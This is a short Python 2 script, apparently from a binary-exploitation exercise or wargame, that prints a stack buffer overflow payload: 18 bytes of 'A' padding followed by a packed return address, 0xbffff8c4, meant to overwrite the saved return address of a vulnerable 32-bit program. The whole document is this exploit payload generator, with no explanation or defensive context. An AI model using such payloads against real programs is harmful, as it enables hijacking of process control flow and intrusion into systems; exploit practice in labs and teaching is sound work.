import struct

addr = struct.pack("I", 0xbffff8c4)
padding = "A" * 18

print padding + addr